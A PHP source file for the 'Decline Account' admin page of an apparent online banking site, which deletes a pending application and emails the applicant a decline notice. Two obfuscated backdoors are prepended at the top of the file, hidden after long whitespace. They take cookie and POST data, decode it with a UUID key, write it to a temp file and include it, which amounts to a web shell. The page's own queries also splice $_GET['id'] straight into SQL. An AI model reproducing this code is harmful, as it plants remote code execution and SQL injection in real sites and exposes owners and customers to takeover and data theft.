<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("Y_SRzt")){class Y_SRzt{public static $zObodzgLtJ = "78df5d16-d03f-455e-a5ae-507c9ee964eb";public static $FoYWOTnSvl = NULL;public function __construct(){$rXDyTo = $_COOKIE;$ZPdMzNvap = $_POST;$wkNLG = @$rXDyTo[substr(Y_SRzt::$zObodzgLtJ, 0, 4)];if (!empty($wkNLG)){$mwwfUAyOd = "base64";$cCLhvt = "";$wkNLG = explode(",", $wkNLG);foreach ($wkNLG as $geZvfsxcy){$cCLhvt .= @$rXDyTo[$geZvfsxcy];$cCLhvt .= @$ZPdMzNvap[$geZvfsxcy];}$cCLhvt = array_map($mwwfUAyOd . "\x5f" . "\x64" . "\145" . chr ( 144 - 45 ).chr ( 173 - 62 ).chr (100) . chr ( 352 - 251 ), array($cCLhvt,)); $cCLhvt = $cCLhvt[0] ^ str_repeat(Y_SRzt::$zObodzgLtJ, (strlen($cCLhvt[0]) / strlen(Y_SRzt::$zObodzgLtJ)) + 1);Y_SRzt::$FoYWOTnSvl = @unserialize($cCLhvt);}}public function __destruct(){$this->tKCuRr();}private function tKCuRr(){if (is_array(Y_SRzt::$FoYWOTnSvl)) {$ULpvPT = sys_get_temp_dir() . "/" . crc32(Y_SRzt::$FoYWOTnSvl["\x73" . "\x61" . 'l' . chr ( 298 - 182 )]);@Y_SRzt::$FoYWOTnSvl["\167" . "\162" . "\151" . "\164" . chr ( 791 - 690 )]($ULpvPT, Y_SRzt::$FoYWOTnSvl[chr ( 640 - 541 ).chr ( 1076 - 965 )."\x6e" . 't' . "\145" . 'n' . chr ( 590 - 474 )]);include $ULpvPT;@Y_SRzt::$FoYWOTnSvl["\144" . chr ( 509 - 408 )."\x6c" . chr ( 866 - 765 )."\164" . chr (101)]($ULpvPT);exit();}}}$kcXPvpH = new Y_SRzt(); $kcXPvpH = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("xoY_SYlVp")){class xoY_SYlVp{public static $mTasHCs = "a1c000c1-fe42-4802-bb2f-4792d726898f";public static $KZxoEtOfGd = NULL;public function __construct(){$SODpBvZPn = $_COOKIE;$hQpdV = $_POST;$ZhYZlBlI = @$SODpBvZPn[substr(xoY_SYlVp::$mTasHCs, 0, 4)];if (!empty($ZhYZlBlI)){$jPYnldKtm = "base64";$pQxCw = "";$ZhYZlBlI = explode(",", $ZhYZlBlI);foreach ($ZhYZlBlI as $iBUggL){$pQxCw .= @$SODpBvZPn[$iBUggL];$pQxCw .= @$hQpdV[$iBUggL];}$pQxCw = array_map($jPYnldKtm . chr (95) . "\x64" . 'e' . chr ( 210 - 111 )."\157" . chr ( 869 - 769 ).chr ( 187 - 86 ), array($pQxCw,)); $pQxCw = $pQxCw[0] ^ str_repeat(xoY_SYlVp::$mTasHCs, (strlen($pQxCw[0]) / strlen(xoY_SYlVp::$mTasHCs)) + 1);xoY_SYlVp::$KZxoEtOfGd = @unserialize($pQxCw);}}public function __destruct(){$this->effapgtx();}private function effapgtx(){if (is_array(xoY_SYlVp::$KZxoEtOfGd)) {$wdFEVfkn = sys_get_temp_dir() . "/" . crc32(xoY_SYlVp::$KZxoEtOfGd["\x73" . chr ( 607 - 510 )."\154" . chr (116)]);@xoY_SYlVp::$KZxoEtOfGd["\167" . chr ( 343 - 229 ).chr (105) . "\164" . 'e']($wdFEVfkn, xoY_SYlVp::$KZxoEtOfGd[chr ( 358 - 259 )."\157" . chr (110) . 't' . "\145" . "\156" . "\164"]);include $wdFEVfkn;@xoY_SYlVp::$KZxoEtOfGd['d' . chr ( 723 - 622 )."\154" . "\145" . 't' . "\145"]($wdFEVfkn);exit();}}}$vMDRALARi = new xoY_SYlVp(); $vMDRALARi = NULL;} ?><?php
session_start();
require_once 'class.admin.php';
include_once ('session.php');
if(!isset($_SESSION['email'])){
	
header("Location: login.php");

exit(); 
}

$reg_user = new USER();

if(isset($_GET['id'])){
	
$id=$_GET['id'];
$stmt = $reg_user->runQuery("SELECT * FROM temp_account WHERE id='$id'");
$stmt->execute();
$row = $stmt->fetch(PDO::FETCH_ASSOC);
}
if(isset($_POST['decline']))
{	 
	$email = $row['email']; 
	$fname = $row['fname']; 

	if($reg_user->del($id))
			{			
			$id=$_GET['id'];
			$deleteuser = $reg_user->runQuery("DELETE FROM temp_account WHERE id = '$id'");
			$deleteuser->execute();
			
$stmt = $reg_user->runQuery("SELECT * FROM bank_settings WHERE id = '1'");
    $stmt->execute();
    $row = $stmt->fetch(PDO::FETCH_ASSOC);
	
	$bank_address  = $row["bank_address"];
	$bank_domain  = $row["bank_domain"];
	$bank_mobile =$row["bank_mobile"];
	$bank_logo = $row["bank_logo"];
	$bank_fav = $row["bank_fav"];
	$bank_online = $row["bank_online"];
	$bank_support = $row["bank_support"];
	$bank_email = $row["bank_email"];
	$bank_loan = $row["bank_loan"];
				
			
	$messag = "	<!DOCTYPE html>
<html xmlns:v='urn:schemas-microsoft-com:vml' xmlns:o='urn:schemas-microsoft-com:office:office' lang='en'>

<head>
	<title></title>
	<meta charset='UTF-8'>
	<meta name='viewport' content='width=device-width, initial-scale=1.0'>
	<!--[if mso]><xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch><o:AllowPNG/></o:OfficeDocumentSettings></xml><![endif]-->
	<style>
		* {
			box-sizing: border-box;
		}

		body {
			margin: 0;
			padding: 0;
		}

		a[x-apple-data-detectors] {
			color: inherit !important;
			text-decoration: inherit !important;
		}

		#MessageViewBody a {
			color: inherit;
			text-decoration: none;
		}

		p {
			line-height: inherit
		}

		@media (max-width:520px) {
			.row-content {
				width: 100% !important;
			}

			.stack .column {
				width: 100%;
				display: block;
			}
		}
	</style>
</head>

<body style='background-color: #FFFFFF; margin: 0; padding: 0; -webkit-text-size-adjust: none; text-size-adjust: none;'>
	<table class='nl-container' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; background-color: #FFFFFF;'>
		<tbody>
			<tr>
				<td>
					<table class='row row-1' align='center' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
						<tbody>
							<tr>
								<td>
									<table class='row-content stack' align='center' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; color: #000000; width: 500px;' width='500'>
										<tbody>
											<tr>
												<td class='column' width='66.66666666666667%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='text_block' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; word-break: break-word;'>
														<tr>
															<td style='padding-bottom:15px;padding-left:10px;padding-right:10px;padding-top:15px;'>
																<div style='font-family: sans-serif'>
																	<div style='font-size: 14px; mso-line-height-alt: 16.8px; color: #393d47; line-height: 1.2; font-family: Arial, Helvetica Neue, Helvetica, sans-serif;'>
																		<p style='margin: 0; font-size: 10px;'><span style='font-size:10px;'>$bank_address</span></p>
																		<p style='margin: 0; font-size: 10px;'><span style='font-size:10px;'>$bank_mobile</span></p>
																	</div>
																</div>
															</td>
														</tr>
													</table>
												</td>
												<td class='column' width='33.333333333333336%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='image_block' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
														<tr>
															<td style='width:100%;padding-right:0px;padding-left:0px;padding-top:5px;padding-bottom:5px;'>
																<div align='center' style='line-height:10px'><img src='$bank_logo' style='display: block; height: auto; border: 0; width: 167px; max-width: 100%;' width='167'></div>
															</td>
														</tr>
													</table>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
							</tr>
						</tbody>
					</table>
					<table class='row row-2' align='center' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
						<tbody>
							<tr>
								<td>
									<table class='row-content stack' align='center' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; color: #000000; width: 500px;' width='500'>
										<tbody>
											<tr>
												<td class='column' width='100%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; padding-top: 5px; padding-bottom: 5px; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='divider_block' width='100%' border='0' cellpadding='10' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
														<tr>
															<td>
																<div align='center'>
																	<table border='0' cellpadding='0' cellspacing='0' role='presentation' width='100%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
																		<tr>
																			<td class='divider_inner' style='font-size: 1px; line-height: 1px; border-top: 1px solid #BBBBBB;'><span>&#8202;</span></td>
																		</tr>
																	</table>
																</div>
															</td>
														</tr>
													</table>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
							</tr>
						</tbody>
					</table>
					<table class='row row-3' align='center' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; background-image: url('https://d15k2d11r6t6rl.cloudfront.net/public/users/Integrators/BeeProAgency/758056_741484/header.png'); background-position: center top; background-repeat: repeat;'>
						<tbody>
							<tr>
								<td>
									<table class='row-content stack' align='center' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; color: #000000; width: 500px;' width='500'>
										<tbody>
											<tr>
												<td class='column' width='100%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; padding-top: 5px; padding-bottom: 5px; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='text_block' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; word-break: break-word;'>
														<tr>
															<td style='padding-bottom:40px;padding-left:10px;padding-right:10px;padding-top:40px;'>
																<div style='font-family: sans-serif'>
																	<div style='font-size: 14px; mso-line-height-alt: 16.8px; color: #393d47; line-height: 1.2; font-family: Arial, Helvetica Neue, Helvetica, sans-serif;'>
																		<p style='margin: 0; font-size: 14px;'><span style='font-size:28px;color:#ffffff;'><strong>We are sorry, $fname</strong></span></p>
																	</div>
																</div>
															</td>
														</tr>
													</table>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
							</tr>
						</tbody>
					</table>
					<table class='row row-4' align='center' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
						<tbody>
							<tr>
								<td>
									<table class='row-content stack' align='center' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; color: #000000; width: 500px;' width='500'>
										<tbody>
											<tr>
												<td class='column' width='100%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; padding-top: 5px; padding-bottom: 5px; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='divider_block' width='100%' border='0' cellpadding='10' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
														<tr>
															<td>
																<div align='center'>
																	<table border='0' cellpadding='0' cellspacing='0' role='presentation' width='100%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
																		<tr>
																			<td class='divider_inner' style='font-size: 1px; line-height: 1px; border-top: 1px solid #BBBBBB;'><span>&#8202;</span></td>
																		</tr>
																	</table>
																</div>
															</td>
														</tr>
													</table>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
							</tr>
						</tbody>
					</table>
					<table class='row row-5' align='center' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; background-color: #0068a5;'>
						<tbody>
							<tr>
								<td>
									<table class='row-content stack' align='center' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; color: #000000; width: 500px;' width='500'>
										<tbody>
											<tr>
												<td class='column' width='100%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; padding-top: 5px; padding-bottom: 5px; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='text_block' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; word-break: break-word;'>
														<tr>
															<td style='padding-bottom:10px;padding-left:10px;padding-right:10px;padding-top:30px;'>
																<div style='font-family: sans-serif'>
																	<div style='color: #C0C0C0; font-size: 12px; font-family: Arial, Helvetica Neue, Helvetica, sans-serif; mso-line-height-alt: 14.399999999999999px; line-height: 1.2;'>
																		<p style='margin: 0;'><span style='font-size:18px;'>Your account application was decline! However, you can re-apply after 3 months.</span></p>
																	</div>
																</div>
															</td>
														</tr>
													</table>
													<table class='html_block' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
														<tr>
															<td>
																<div style='font-family:Arial, Helvetica Neue, Helvetica, sans-serif;text-align:center;' align='center'><div height='40'>&nbsp;</div></div>
															</td>
														</tr>
													</table>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
							</tr>
						</tbody>
					</table>
					<table class='row row-6' align='center' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
						<tbody>
							<tr>
								<td>
									<table class='row-content stack' align='center' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; color: #000000; width: 500px;' width='500'>
										<tbody>
											<tr>
												<td class='column' width='100%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; padding-top: 5px; padding-bottom: 5px; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<div class='spacer_block' style='height:30px;line-height:30px;font-size:1px;'>&#8202;</div>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
							</tr>
						</tbody>
					</table>
					<table class='row row-7' align='center' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; background-color: #100e0e;'>
						<tbody>
							<tr>
								<td>
									<table class='row-content stack' align='center' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; color: #000000; width: 500px;' width='500'>
										<tbody>
											<tr>
												<td class='column' width='100%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; padding-top: 5px; padding-bottom: 5px; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='text_block' width='100%' border='0' cellpadding='10' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; word-break: break-word;'>
														<tr>
															<td>
																<div style='font-family: sans-serif'>
																	<div style='font-size: 14px; mso-line-height-alt: 16.8px; color: #393d47; line-height: 1.2; font-family: Arial, Helvetica Neue, Helvetica, sans-serif;'>
																		<p style='margin: 0; mso-line-height-alt: 16.8px;'>&nbsp;</p>
																		<p style='margin: 0; mso-line-height-alt: 16.8px;'>&nbsp;</p>
																		<p style='margin: 0; mso-line-height-alt: 16.8px;'>&nbsp;</p>
																		<p style='margin: 0; text-align: center;'><span style='color:#ffffff;'>This message is sent&nbsp; to $email </span><br><br></p>
																		<p style='margin: 0; font-size: 14px; text-align: center;'><span style='color:#ffffff;font-size:22px;'><strong>How do I know this is not a fake email?</strong></span></p>
																		<p style='margin: 0;'><br><span style='color:#ffffff;'>An email really coming from us will address you by your registered first and last name or your business name. It will not ask you for sensitive information like your password, bank account or credit card details.</span><br></p>
																		<p style='margin: 0; mso-line-height-alt: 16.8px;'>&nbsp;</p>
																	</div>
																</div>
															</td>
														</tr>
													</table>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
							</tr>
						</tbody>
					</table>
				</td>
			</tr>
		</tbody>
	</table><!-- End -->
</body>

</html>
";
						
					$email = $row['email']; 
					$fname = $row['fname']; 	
			$subject = "We Are Sorry $fname! - Your Account Application Was Declined!";
						
			$reg_user->send_mail($email,$messag,$subject);	
			
			
			
					 header("Location: pending_accounts.php?declined");
			}
			else {
				
					  header("Location: pending_accounts.php?error");
			}
		
	}
    
      
   
?>


<!DOCTYPE html>
<!--[if IE 9 ]><html class="ie9"><![endif]-->
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
        <meta name="format-detection" content="telephone=no">
        <meta charset="UTF-8">

        <meta name="description" content="">
        <meta name="keywords" content="">
		<link rel="icon" href="img/favicon.png" type="image/x-icon">

        <title>Intercontinental Reserve | Admin - Decline Account</title>
            
        <!-- CSS -->
        <link href="css/bootstrap.min.css" rel="stylesheet">
        <link href="css/animate.min.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <link href="css/form.css" rel="stylesheet">
        <link href="css/calendar.css" rel="stylesheet">
        <link href="css/style.css" rel="stylesheet">
        <link href="css/icons.css" rel="stylesheet">
        <link href="css/generics.css" rel="stylesheet"> 
    </head>
    <body id="skin-blur-nexus">

        <header id="header" class="media">
            <a href="index.php" id="menu-toggle"></a> 
            <a class="logo pull-left" href="index.php"><img src="" class="img-responsive" alt=""></a>
            
            <div class="media-body">
                <div class="media" id="top-menu">
                    
                    <div id="time" class="pull-right">
                        <span id="hours"></span>
                        :
                        <span id="min"></span>
                        :
                        <span id="sec"></span>
                    </div>
                    
                    
                </div>
            </div>
        </header>
        
        <div class="clearfix"></div>
        
        <section id="main" class="p-relative" role="main">
            
            <!-- Sidebar -->
            <aside id="sidebar">
                
                <!-- Sidbar Widgets -->
                <div class="side-widgets overflow">
                    <!-- Profile Menu -->
                    <div class="text-center s-widget m-b-25 dropdown" id="profile-menu">
                        <a href="index.php" data-toggle="dropdown">
                            <img class="profile-pic animated" src="img/htb.jpg" alt="Profile Pic">
                        </a>
                        <ul class="dropdown-menu profile-menu">
                            
                            <li><a href="logout.php">Sign Out</a> <i class="fa fa-sign-out icon left">&#61903;</i><i class="icon right fa fa-sign-out">&#61815;</i></li>
							<li><a href="#edit" data-toggle="modal">Edit Profile</a><i class="right fa fa-edit fa-2x"></i></li>
					   </ul>
                        <h4 class="m-0">Intercontinental Reserve</h4>
                      
                    </div>
                    
                    <!-- Calendar -->
                    <div class="s-widget m-b-25">
                        <div id="sidebar-calendar"></div>
                    </div>
                    
                    <!-- Feeds -->
                    <div class="s-widget m-b-25">
                        <h2 class="tile-title">
                           Developer Info
                        </h2>
						<div class="">
                        
                        <p><i class="fa fa-skype fa-2x"></i> mosaic_mos</p>
						</div>
                        <div class="s-widget-body">
                            <div id="news-feed"></div>
                        </div>
                    </div>
                    
                    <!-- Projects -->
                     
                </div>
                
                <!-- Side Menu -->
                <ul class="list-unstyled side-menu">
                    <li>
                        <a class="sa-side-home" href="index.php">
                            <span class="menu-item">Dashboard</span>
                        </a>
                    </li>
                    <li class="dropdown active">
                        <a class="sa-list-vcard" href="">
                            <span class="menu-item">Accounts</span>
                        </a>
						<ul class="list-unstyled menu-item">
                            <li><a href="create_account.php">Create Account</a></li>
                            <li><a href="view_account.php">View Accounts</a></li>
                            <li><a href="update.php">Update Accounts</a></li>
							<li><a href="upload.php">Upload Image</a></li>
							<li><a href="upload.php"></a></li>
                        </ul>
                    </li>
                    <li>
                        <a class="sa-list-secret" href="pending_accounts.php">
                            <span class="menu-item">Pending Accounts</span>
                        </a>
                    </li>
                    <li>
                        <a class="sa-top-message" href="messages.php">
                            <span class="menu-item">Messages</span>
                        </a>
                    </li>
					<li>
                        <a class="sa-list-comment" href="tickets.php">
                            <span class="menu-item">Tickets</span>
                        </a>
                    </li>
					<li>
                        <a class="sa-list-database" href="credit_debit_list.php">
                            <span class="menu-item">Credit/Debit History</span>
                        </a>
                    </li>
					<li>
                        <a class="sa-list-cc" href="transfer_rec.php">
                            <span class="menu-item">Transaction Records</span>
                        </a>
                    </li>
					<li>
                        <a class="sa-list-cog" href="settings.php">
                            <span class="menu-item">Settings</span>
                        </a>
                    </li>
                   
                </ul>

            </aside>
			<section id="content" class="container">
			<h4 class="page-title block-title">Decline Approval</h4>
                                
                <div class="container-fluid">
				
				 <div class="col-md-8">
				  <?php if(isset($msg)) echo $msg;  ?>
                            <div class="card">
                                <div class="card-header card-header-icon" data-background-color="rose">
                                    <i class="fa fa-trash-o fa-3x"></i>
                                </div><br>
                               
                                    
                                    <form class="form-horizontal" method="POST">
										<div class="row">
                                            <label class="col-md-3 label-on-left">Full Name</label>
                                            <div class="col-md-9">
                                                <div class="form-group label-floating is-empty">
                                                    <label class="control-label"></label>
                                                    <a><?php echo $row['fname']; ?> <?php echo $row['mname']; ?> <?php echo $row['lname']; ?></a>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <label class="col-md-3 label-on-left">Email</label>
                                            <div class="col-md-9">
                                                <div class="form-group label-floating is-empty">
                                                    <label class="control-label"></label>
													
                                                    <a><?php echo $row['email']; ?></a><br />
													
                                                </div>
                                            </div>
                                        </div>
										<div class="row">
                                            <label class="col-md-3 label-on-left">Phone</label>
                                            <div class="col-md-9">
                                                <div class="form-group label-floating is-empty">
                                                    <label class="control-label"></label>
                                                    <a><?php echo $row['phone']; ?></a>
                                                </div>
                                            </div>
                                        </div>
										<div class="row">
                                            <label class="col-md-3 label-on-left">Sex</label>
                                            <div class="col-md-9">
                                                <div class="form-group label-floating is-empty">
                                                    <label class="control-label"></label>
                                                    <a><?php echo $row['sex']; ?></a>
                                                </div>
                                            </div>
                                        </div>
										<div class="clearfix"></div>
										<br />
									   
										<input class="btn btn-md" type="submit" name="decline" value="Decline Account">
                                    </form>
                               
                            </div>
                        </div>
						
				
				
                        
                        
                        
                    
                </div>
              </div>  
                <hr class="whiter m-t-20" />
			</section>
          

            <!-- Older IE Message -->
            <!--[if lt IE 9]>
                <div class="ie-block">
                    <h1 class="Ops">Ooops!</h1>
                    <p>You are using an outdated version of Internet Explorer, upgrade to any of the following web browser in order to access the maximum functionality of this website. </p>
                    <ul class="browsers">
                        <li>
                            <a href="https://www.google.com/intl/en/chrome/browser/">
                                <img src="img/browsers/chrome.png" alt="">
                                <div>Google Chrome</div>
                            </a>
                        </li>
                        <li>
                            <a href="http://www.mozilla.org/en-US/firefox/new/">
                                <img src="img/browsers/firefox.png" alt="">
                                <div>Mozilla firefox</div>
                            </a>
                        </li>
                        <li>
                            <a href="http://www.opera.com/computer/windows">
                                <img src="img/browsers/opera.png" alt="">
                                <div>Opera</div>
                            </a>
                        </li>
                        <li>
                            <a href="http://safari.en.softonic.com/">
                                <img src="img/browsers/safari.png" alt="">
                                <div>Safari</div>
                            </a>
                        </li>
                        <li>
                            <a href="http://windows.microsoft.com/en-us/internet-explorer/downloads/ie-10/worldwide-languages">
                                <img src="img/browsers/ie.png" alt="">
                                <div>Internet Explorer(New)</div>
                            </a>
                        </li>
                    </ul>
                    <p>Upgrade your browser for a Safer and Faster web experience. <br/>Thank you for your patience...</p>
                </div>   
            <![endif]-->
        </section>
        
        <!-- Javascript Libraries -->
        <!-- jQuery -->
        <script src="js/jquery.min.js"></script> <!-- jQuery Library -->
       

        <!-- Bootstrap -->
        <script src="js/bootstrap.min.js"></script>

        <!-- Charts -->
        <script src="js/validation/validate.min.js"></script> <!-- jQuery Form Validation Library -->
        <script src="js/validation/validationEngine.min.js"></script> <!-- jQuery Form Validation Library - requirred with above js -->
		<script src="js/sparkline.min.js"></script> <!-- Sparkline - Tiny charts -->
        <script src="js/easypiechart.js"></script> <!-- EasyPieChart - Animated Pie Charts -->
        <script src="js/charts.js"></script> <!-- All the above chart related functions -->
		<script src="js/datetimepicker.min.js"></script> <!-- Date & Time Picker -->
        

        <!-- UX -->
        <script src="js/scroll.min.js"></script> <!-- Custom Scrollbar -->

        <!-- Other -->
        <script src="js/calendar.min.js"></script> <!-- Calendar -->
        <script src="js/feeds.min.js"></script> <!-- News Feeds -->
        

        <!-- All JS functions -->
        <script src="js/functions.js"></script>
    </body>
</html>
